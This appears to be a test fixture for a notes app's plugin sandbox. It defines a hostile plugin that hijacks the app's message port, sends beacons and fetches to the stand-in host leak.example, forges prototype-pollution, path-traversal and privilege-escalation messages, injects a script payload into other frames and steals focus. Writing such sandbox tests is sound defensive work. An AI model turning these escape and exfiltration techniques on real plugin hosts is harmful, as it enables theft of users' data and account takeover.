/* eslint-disable */
// A plugin that tries everything a plugin must not be able to do. `hostile` is never called here:
// its text is installed as a plugin's code and runs in the plugin's frames. Each attempt records what
// came of it, and a test reads that from the frame. Nothing in it may refer to anything outside itself.

import type { Written } from "./third-party-helpers.ts";

declare const ink: any;

function hostile(APP: string) {
  const w = window as any;
  // The app's script keeps the port to itself. Its next send hands it over.
  const post = MessagePort.prototype.postMessage;
  const stolen: Promise<MessagePort> = new Promise((ok) => {
    MessagePort.prototype.postMessage = function (this: MessagePort, ...args: any[]) {
      MessagePort.prototype.postMessage = post;
      ok(this);
      return (post as any).apply(this, args);
    } as any;
  });
  const heard: any[] = [];
  const atWindow: string[] = [];
  addEventListener("message", (event) => atWindow.push(JSON.stringify(event.data)));
  void stolen.then((port) => port.addEventListener("message", (event) => heard.push(event.data)));
  ink.perform({ type: "note.list" }).then(
    (notes: any[]) => (w.started = "listed " + notes.length),
    (err: any) => (w.started = "refused: " + err.code),
  );

  let next = 5_000_000;
  const pause = (ms: number) => new Promise((done) => setTimeout(done, ms));
  /** Sends anything at all over the port, and says what came back for it: "ok", the error, or "nothing". */
  const raw = async (message: any, wait = 900): Promise<string> => {
    const port = await stolen;
    const id = message && typeof message === "object" && Number.isInteger(message.id) ? message.id : null;
    const from = heard.length;
    port.postMessage(message);
    for (const until = Date.now() + wait; Date.now() < until; await pause(20)) {
      const reply = heard.slice(from).find((m) => m && (id === null || m.reply === id));
      if (reply && id === null) return "answered: " + JSON.stringify(reply);
      if (reply) return reply.ok ? "ok" : reply.error.code + ": " + reply.error.message;
    }
    return "nothing";
  };
  const call = (fields: any, wait = 4000) => raw({ v: 1, id: next++, ...fields }, wait);
  const perform = (op: any) => call({ call: "perform", op });
  const attempt = async (found: Record<string, string>, name: string, run: () => any) => {
    try {
      found[name] = String(await run());
    } catch (err: any) {
      found[name] = "refused: " + (err && err.name);
    }
  };
  const loads = (make: () => any) =>
    new Promise((ok, no) => {
      const el = make();
      el.onload = () => ok("loaded");
      el.onerror = () => no({ name: "error" });
      document.body.append(el);
    });
  const blocked: string[] = [];
  addEventListener("securitypolicyviolation", (event) => blocked.push(event.blockedURI));

  w.attacks = {
    heard: () => heard.length,
    atWindow: () => atWindow,
    blocked: () => blocked,

    /** Reaching out of the frame: the app's page, the member's session, what the browser keeps, the network. */
    async reach({ workspace, self: id }: { workspace: string; self: string }) {
      const found: Record<string, string> = {};
      const ops = APP + "/api/workspaces/" + workspace + "/ops";
      const asOp = (credentials: RequestCredentials, mode?: RequestMode) => ({ method: "POST", credentials, mode, headers: { "Content-Type": "application/json" }, body: JSON.stringify({ type: "note.list" }) });
      await attempt(found, "origin", () => self.origin);
      await attempt(found, "parent document", () => parent.document.title);
      await attempt(found, "top document", () => top!.document.body.innerHTML.length);
      await attempt(found, "top location", () => top!.location.href);
      await attempt(found, "parent location", () => parent.location.href);
      await attempt(found, "top storage", () => top!.localStorage.length);
      await attempt(found, "cookie", () => {
        document.cookie = "probe=1";
        return "cookie:" + document.cookie;
      });
      await attempt(found, "localStorage", () => localStorage.length);
      await attempt(found, "sessionStorage", () => sessionStorage.length);
      await attempt(found, "indexedDB", () => new Promise((ok, no) => {
        const open = indexedDB.open("probe");
        open.onsuccess = () => ok("opened");
        open.onerror = () => no({ name: "error" });
      }));
      await attempt(found, "caches", () => caches.open("probe").then(() => "opened"));
      await attempt(found, "fetch /api/me with the session", () => fetch(APP + "/api/me", { credentials: "include" }).then((r) => r.status));
      await attempt(found, "fetch /api/me without", () => fetch(APP + "/api/me", { credentials: "omit" }).then((r) => r.status));
      await attempt(found, "fetch /api/me without cors", () => fetch(APP + "/api/me", { mode: "no-cors", credentials: "include" }).then((r) => r.type));
      await attempt(found, "the operations address with the session", () => fetch(ops, asOp("include")).then((r) => r.status));
      await attempt(found, "the operations address without", () => fetch(ops, asOp("omit")).then((r) => r.status));
      await attempt(found, "the operations address without cors", () => fetch(ops, asOp("include", "no-cors")).then((r) => r.type));
      await attempt(found, "its own operations address", () => fetch(APP + "/api/workspaces/" + workspace + "/plugins/" + id + "/ops", asOp("include")).then((r) => r.status));
      await attempt(found, "fetch another site", () => fetch("https://leak.example/fetch").then((r) => r.status));
      await attempt(found, "xhr", () => new Promise((ok, no) => {
        const x = new XMLHttpRequest();
        x.open("GET", "https://leak.example/xhr");
        x.onload = () => ok(x.status);
        x.onerror = () => no({ name: "error" });
        x.send();
      }));
      await attempt(found, "image", () => loads(() => Object.assign(new Image(), { src: "https://leak.example/image.png" })));
      await attempt(found, "script", () => loads(() => Object.assign(document.createElement("script"), { src: "https://leak.example/script.js" })));
      await attempt(found, "frame", () => loads(() => Object.assign(document.createElement("iframe"), { src: "https://leak.example/frame" })).then(() => "made"));
      await attempt(found, "websocket", () => new Promise((ok, no) => {
        const ws = new WebSocket("wss://leak.example/ws");
        ws.onopen = () => ok("open");
        ws.onerror = () => no({ name: "error" });
      }));
      await attempt(found, "event source", () => new Promise((ok, no) => {
        const es = new EventSource("https://leak.example/events");
        es.onopen = () => ok("open");
        es.onerror = () => no({ name: "error" });
      }));
      await attempt(found, "beacon", () => navigator.sendBeacon("https://leak.example/beacon", "x"));
      await attempt(found, "worker", () => new Promise((ok, no) => {
        const worker = new Worker(URL.createObjectURL(new Blob(["fetch('https://leak.example/worker')"], { type: "text/javascript" })));
        worker.onerror = () => no({ name: "error" });
        setTimeout(() => ok("started"), 300);
      }));
      await attempt(found, "popup", () => (window.open("https://leak.example/popup") ? "opened" : "refused: null"));
      await attempt(found, "navigate the top window", () => {
        top!.location = "https://leak.example/top" as any;
        return "navigated";
      });
      await attempt(found, "history", () => {
        history.pushState({}, "", "#pushed");
        return "pushed";
      });
      await attempt(found, "allowed: note.list over its port", () => perform({ type: "note.list" }));
      return found;
    },

    /** Everything that can be said over its own port, well formed or not. */
    async port({ self, victim, visible, hidden }: { self: string; victim: string; visible: string; hidden: string }) {
      const found: Record<string, string> = {};
      const say = async (name: string, run: () => Promise<string>) => void (found[name] = await run());
      const forged = (text: string) => JSON.parse(text.replace("ID", String(next++)));
      await say("allowed: note.list", () => perform({ type: "note.list" }));
      await say("allowed: note.read", () => perform({ type: "note.read", id: visible }));
      await say("allowed: open a note", () => call({ call: "open", noteId: visible }));
      await say("a string", () => raw("perform note.list"));
      await say("an empty object", () => raw({}));
      await say("no call", () => raw({ v: 1, id: next++ }));
      await say("another version", () => raw({ v: 2, id: next++, call: "perform", op: { type: "note.list" } }));
      await say("no version", () => raw({ id: next++, call: "perform", op: { type: "note.list" } }));
      await say("an unknown key", () => raw({ v: 1, id: next++, call: "perform", op: { type: "note.list" }, urgent: true }));
      await say("a plugin field claiming another install", () => raw({ v: 1, id: next++, call: "perform", op: { type: "note.list" }, plugin: victim }));
      await say("a pluginId field claiming another install", () => raw({ v: 1, id: next++, call: "notify", message: "as the other", pluginId: victim }));
      await say("an id that isn't a number", () => raw({ v: 1, id: "1", call: "perform", op: { type: "note.list" } }));
      await say("a megabyte of notice", () => raw({ v: 1, id: next++, call: "notify", message: "x".repeat(1_000_000) }));
      await say("a megabyte in an operation", () => raw({ v: 1, id: next++, call: "perform", op: { type: "note.read", id: visible, padding: "x".repeat(1_000_000) } }));
      await say("what the app sends, sent back", () => raw({ v: 1, init: { granted: ["notes.write"], plugin: { name: "Common Ink" } } }));
      await say("a second ready", () => raw({ v: 1, ready: true }));
      await say("__proto__ in an operation", () => raw(forged('{"v":1,"id":ID,"call":"perform","op":{"type":"note.list","__proto__":{"polluted":true}}}')));
      await say("constructor.prototype in an operation", () => raw(forged('{"v":1,"id":ID,"call":"perform","op":{"type":"note.list","constructor":{"prototype":{"polluted":true}}}}')));
      await say("__proto__ beside the call", () => raw(forged('{"v":1,"id":ID,"call":"notify","message":"x","__proto__":{"call":"perform"}}')));
      await say("note.write without the permission", () => perform({ type: "note.write", id: visible, baseRevision: 1, text: "# Taken over" }));
      await say("note.create without the permission", () => perform({ type: "note.create", text: "# Planted" }));
      await say("note.trash", () => perform({ type: "note.trash", id: visible }));
      await say("settings.read", () => perform({ type: "settings.read" }));
      await say("settings.write", () => perform({ type: "settings.write", text: "{}", baseRevision: 0 }));
      await say("plugin.permit", () => perform({ type: "plugin.permit", id: self, capability: "notes.write", allowed: true }));
      await say("plugin.install", () => perform({ type: "plugin.install", manifest: '{"name":"More"}', code: "1" }));
      await say("plugin.list", () => perform({ type: "plugin.list" }));
      await say("plugin.frame", () => perform({ type: "plugin.frame", id: self }));
      await say("member.invite", () => perform({ type: "member.invite", email: "mallory@example.com", as: "admin" }));
      await say("member.list", () => perform({ type: "member.list" }));
      await say("upload.list", () => perform({ type: "upload.list" }));
      await say("grant.link", () => perform({ type: "grant.link", noteId: visible, link: "public" }));
      await say("history.revertAuthor", () => perform({ type: "history.revertAuthor", author: { kind: "member", id: visible } }));
      await say("an operation there isn't", () => perform({ type: "note.exfiltrate" }));
      await say("another member's private note", () => perform({ type: "note.read", id: hidden }));
      await say("a path for an id", () => perform({ type: "note.read", id: "../../../me" }));
      await say("a path after an id", () => perform({ type: "note.read", id: visible + "/../../plugins/" + victim + "/ops" }));
      await say("an address to open", () => call({ call: "open", noteId: "/settings" }));
      await say("asking the host to run a command", () => raw({ v: 1, id: next++, call: "run", command: "plugins.enable." + self }));
      await say("asking the host to turn another plugin off", () => raw({ v: 1, id: next++, call: "run", command: "plugins.disable." + victim }));
      await say("a command event sent back", () => raw({ v: 1, event: "command", id: "plugins.disable." + victim }));
      await say("still allowed: note.list", () => perform({ type: "note.list" }));
      return found;
    },

    /** Sends one operation as it is given, whatever is beside its fields. */
    perform,

    /** As many messages as can be sent, at once. */
    async flood(count: number) {
      const port = await stolen;
      for (let i = 0; i < count; i++) port.postMessage({ v: 1, id: next++, call: "notify", message: "flood " + i });
      return "sent";
    },

    /** The other frames in the app, which are other plugins' and the app's own. */
    others() {
      const found: string[] = [];
      const read = (name: string, run: () => any) => {
        try {
          found.push(name + ": read " + String(run()).slice(0, 40));
        } catch (err: any) {
          found.push(name + ": refused: " + err.name);
        }
      };
      for (let i = 0; i < top!.frames.length; i++) {
        const outer = top!.frames[i] as any;
        // Its own frame is its own to read.
        if (outer === parent) continue;
        read("document of frame " + i, () => outer.document.title);
        read("location of frame " + i, () => outer.location.href);
        read("ink of frame " + i, () => outer.ink.context.kind);
        read("the frame inside frame " + i, () => outer.frames[0].document.body.textContent);
        read("ink inside frame " + i, () => outer.frames[0].ink.plugin.name);
        read("storage inside frame " + i, () => outer.frames[0].localStorage.length);
      }
      return { count: top!.frames.length, found };
    },

    /**
     * Keeps sending every frame in the app, and the app itself, messages shaped like the ones that
     * hand a frame its document and its port, each with a port of this plugin's own. `forging` says
     * how many were sent and what the ports ever heard.
     */
    forge() {
      const state = (w.forging = { sent: 0, heardOnForged: [] as string[] });
      const port = () => {
        const channel = new MessageChannel();
        channel.port1.onmessage = (event) => state.heardOnForged.push(JSON.stringify(event.data));
        return channel.port2;
      };
      const send = (to: any, message: any, transfer: any[] = []) => {
        try {
          to.postMessage(message, "*", transfer);
          state.sent++;
        } catch {}
      };
      w.forger = setInterval(() => {
        for (let i = 0; i < top!.frames.length; i++) {
          const outer = top!.frames[i] as any;
          if (outer === parent) continue;
          send(outer, { html: "<p id='pwned'>pwned</p><script>parent.parent.postMessage({ pwned: true }, '*')</script>", scheme: "dark" }, [port()]);
          send(outer, { inkPort: true }, [port()]);
          try {
            for (let j = 0; j < outer.frames.length; j++) {
              send(outer.frames[j], { inkPort: true }, [port()]);
              send(outer.frames[j], { v: 1, init: { context: { kind: "background" }, settings: {}, granted: [], plugin: { name: "Hostile", version: "1" } } });
            }
          } catch {}
        }
        send(top, { embedFrame: "ready" }, [port()]);
        send(parent, { embedFrame: "ready" });
        send(top, { v: 1, id: next++, call: "perform", op: { type: "note.list" } }, [port()]);
        send(top, { v: 1, id: next++, call: "notify", message: "from the window" });
        send(top, { v: 1, ready: true }, [port()]);
        send(top, { inkPort: true }, [port()]);
      }, 5);
      return "forging";
    },
    forged() {
      clearInterval(w.forger);
      return w.forging;
    },
  };

  const context = ink.context;
  const what = context.kind === "embed" ? context.config : context.kind === "view" ? context.id : "";
  const steal = () => {
    const input = ink.root.appendChild(document.createElement("input"));
    setInterval(() => {
      try {
        window.focus();
        input.focus();
      } catch {}
    }, 30);
  };
  const later = (run: () => void) =>
    setTimeout(() => {
      try {
        run();
        w.did = "ran";
      } catch (err: any) {
        w.did = "refused: " + err.name;
      }
    }, 300);
  ink.root.append("Hostile " + context.kind + " " + what);
  ink.onCommand("start", () => void (w.commanded = true));
  ink.onCommand("steal", steal);
  if (what === "steal" || what === "thief") steal();
  if (what === "self") later(() => void (location.href = APP + "/api/me?leak=self"));
  if (what === "shell") later(() => void (parent.location.href = APP + "/api/me?leak=shell"));
  if (what === "top") later(() => void (top!.location.href = "https://leak.example/top"));
  if (what === "named") later(() => void window.open(APP + "/api/me?leak=named", "_top"));
  if (what === "link") {
    const a = ink.root.appendChild(Object.assign(document.createElement("a"), { href: "https://leak.example/link", target: "_top", textContent: "go" }));
    later(() => a.click());
  }
  if (what === "popup") later(() => void (w.opened = String(window.open("https://leak.example/popup"))));
  if (what === "cover") {
    const sheet = document.body.appendChild(document.createElement("div"));
    sheet.id = "sheet";
    sheet.style.cssText = "position: fixed; left: -5000px; top: -5000px; width: 20000px; height: 20000px; background: red; z-index: 2147483647;";
    document.documentElement.style.cssText = "width: 20000px; height: 20000px; overflow: visible;";
    later(() => {
      window.resizeTo(5000, 5000);
      window.moveTo(0, 0);
      (frameElement as any).style.position = "fixed";
    });
  }
}

export const hostileCode = (app: string) => `(${hostile.toString()})(${JSON.stringify(app)});`;

export const hostileManifest = (app: string): Written => ({
  name: "Hostile",
  description: "Tries everything.",
  capabilities: [
    { name: "notes.read", reason: "To look around." },
    { name: "notes.write", reason: "To write as you." },
    { name: "network", reason: "To phone home.", origins: [app] },
  ],
  commands: [
    { id: "start", title: "Start" },
    { id: "steal", title: "Steal the keyboard" },
  ],
  views: [
    { slot: "inspector", id: "probe", label: "Probe" },
    { slot: "inspector", id: "thief", label: "Thief" },
  ],
  embeds: [{ name: "trap", title: "Trap", height: 80 }],
});

export const VICTIM: Written = {
  name: "Victim",
  capabilities: [{ name: "notes.read", reason: "To count notes." }],
  views: [{ slot: "inspector", id: "panel", label: "Victim" }],
  embeds: [{ name: "victim", title: "Victim", height: 60 }],
};

/** A plugin that minds its own business: it keeps asking for the notes and saying what it was told. */
export const VICTIM_CODE = `
const out = ink.root.appendChild(document.createElement("p"));
out.id = "out";
let rounds = 0;
const round = () => ink.perform({ type: "note.list" }).then(
  (notes) => { out.textContent = ink.plugin.name + " " + ink.context.kind + " listed " + notes.length + " round " + ++rounds; },
  (err) => { out.textContent = "refused: " + err.code; },
);
round();
setInterval(round, 400);
`;
